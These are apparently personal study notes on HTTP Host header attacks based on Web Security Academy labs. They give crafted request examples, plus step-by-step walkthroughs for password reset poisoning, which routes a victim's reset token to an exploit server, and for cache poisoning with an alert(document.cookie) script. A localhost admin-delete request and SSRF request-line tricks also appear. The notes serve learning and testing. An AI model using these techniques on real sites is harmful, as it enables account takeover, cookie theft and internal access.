## How to test for vulnerabilities using the HTTP Host header
- Supply an arbitrary Host header: the first step is to test what happens when you supply an arbitrary, unrecognized domain name via the Host header.
- Check for flawed validation: Instead of receiving an "`Invalid Host header`" response, you might find that your request is blocked as a result of some kind of security measure.
```bash
# some parsing algorithms will omit the port from the Host header, meaning that only the domain name is validated, If you are also able to supply a non-numeric port, you can leave the domain name untouched to ensure that you reach the target application
GET /example HTTP/1.1
Host: vulnerable-website.com:bad-stuff-here
# try to apply matching logic to allow for arbitrary subdomains
GET /example HTTP/1.1
Host: notvulnerable-website.com
# you could take advantage of a less-secure subdomain that you have already compromised
GET /example HTTP/1.1
Host: hacked-subdomain.vulnerable-website.com
```
- Send ambiguous requests: 
```bash
# Inject duplicate Host headers
GET /example HTTP/1.1
Host: vulnerable-website.com
Host: bad-stuff-here
# Supply an absolute URL
GET https://vulnerable-website.com/ HTTP/1.1
Host: bad-stuff-here
# Add line wrapping
GET /example HTTP/1.1
    Host: bad-stuff-here
Host: vulnerable-website.com
```
- Inject host override headers: You can sometimes use `X-Forwarded-Host` to inject your malicious input while circumventing any validation on the Host header itself.
```bash
GET /example HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: bad-stuff-here

#Although X-Forwarded-Host is the de facto standard for this behavior, you may come across other headers that serve a similar purpose, including: 
-X-Host
-X-Forwarded-Server
-X-HTTP-Host-Override
-Forwarded
```
In Burp Suite, you can use the [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) extension's "Guess headers" function to automatically probe for supported headers using its extensive built-in wordlist.
## Password reset poisoning
- Go to the login page and notice the "Forgot your password?" functionality. Request a password reset for your own account.
- Go to the exploit server and open the email client. Observe that you have received an email containing a link to reset your password. Notice that the URL contains the query parameter `temp-forgot-password-token`.
- Click the link and observe that you are prompted to enter a new password. Reset your password to whatever you want.
- In Burp, study the HTTP history. Notice that the `POST /forgot-password` request is used to trigger the password reset email. This contains the username whose password is being reset as a body parameter. Send this request to Burp Repeater.
- In Burp Repeater, observe that you can change the Host header to an arbitrary value and still successfully trigger a password reset. Go back to the email server and look at the new email that you've received. Notice that the URL in the email contains your arbitrary Host header instead of the usual domain name.
- Back in Burp Repeater, change the Host header to your exploit server's domain name (`YOUR-EXPLOIT-SERVER-ID.exploit-server.net`) and change the `username` parameter to `carlos`. Send the request.
- Go to your exploit server and open the access log. You will see a request for `GET /forgot-password` with the `temp-forgot-password-token` parameter containing Carlos's password reset token. Make a note of this token.
- Go to your email client and copy the genuine password reset URL from your first email. Visit this URL in the browser, but replace your reset token with the one you obtained from the access log.
- Change Carlos's password to whatever you want, then log in as `carlos` to solve the lab.
## Web cache poisoning via the Host header
- In Burp's browser, open the lab and click **Home** to refresh the home page.
- In **Proxy > HTTP history**, right-click the `GET /` request and select **Send to Repeater**.
- In Repeater, study the lab's behavior. Notice that the website validates the Host header. If you modify the Host header, you can no longer access the home page.
- In the original response, notice the verbose caching headers, which tell you when you get a cache hit and how old the cached response is. Add an arbitrary query parameter to your requests to serve as a cache buster, for example, `GET /?cb=123`. You can change this parameter each time you want a fresh response from the back-end server.
- Notice that if you add a second Host header with an arbitrary value, this appears to be ignored when validating and routing your request. Crucially, notice that the arbitrary value of your second Host header is reflected in an absolute URL used to import a script from `/resources/js/tracking.js`.
- Remove the second Host header and send the request again using the same cache buster. Notice that you still receive the same cached response containing your injected value.
- Go to the exploit server and create a file at `/resources/js/tracking.js` containing the payload `alert(document.cookie)`. Store the exploit and copy the domain name for your exploit server.
- Back in Burp Repeater, add a second Host header containing your exploit server domain name. The request should look something like this:
    
    `GET /?cb=123 HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
- Send the request a couple of times until you get a cache hit with your exploit server URL reflected in the response. To simulate the victim, request the page in the browser using the same cache buster in the URL. Make sure that the `alert()` fires.
- In Burp Repeater, remove any cache busters and keep replaying the request until you have re-poisoned the cache. The lab is solved when the victim visits the home page.
## Accessing restricted functionality
Local users = localhost
![314](Pasted%20image%2020261013124558.png)
```
GET /admin/delete?username=carlos HTTP/2
Host: localhost
Cookie: .......
```
## Accessing internal websites with virtual host brute-forcing
As the internal hostname may resolve to the private IP address, this scenario can't always be detected simply by looking at DNS records:
`www.example.com: 12.34.56.78` - `intranet.example.com: 10.0.0.132`
If they have discovered a hidden domain name through other means, such as information disclosure, they could simply request this directly. Otherwise, they can use tools like Burp Intruder to brute-force virtual hosts using a simple wordlist of candidate subdomains.
## Routing-based SSRF
Pendiente

## Connection state attacks
For performance reasons, many websites reuse connections for multiple request/response cycles with the same client. Poorly implemented HTTP servers sometimes work on the dangerous assumption that certain properties, such as the Host header, are identical for all HTTP/1.1 requests sent over the same connection. This may be true of requests sent by a browser, but isn't necessarily the case for a sequence of requests sent from Burp Repeater. This can lead to a number of potential issues.
![](Pasted%20image%2020261013134403.png)
"Missing parameter 'csrf'"
![](Pasted%20image%2020261013134426.png)
Many reverse proxies use the Host header to route requests to the correct back-end. If they assume that all requests on the connection are intended for the same host as the initial request, this can provide a useful vector for a number of Host header attacks, including routing-based SSRF, password reset poisoning, and cache poisoning.
## SSRF via a malformed request line
Custom proxies sometimes fail to validate the request line properly, which can allow you to supply unusual, malformed input with unfortunate results.
For example, a reverse proxy might take the path from the request line, prefix it with `http://backend-server`, and route the request to that upstream URL. This works fine if the path starts with a `/` character, but what if starts with an `@` character instead?
```
GET @private-intranet/example HTTP/1.1
```
The resulting upstream URL will be `http://backend-server@private-intranet/example`, which most HTTP libraries interpret as a request to access `private-intranet` with the username `backend-server`.
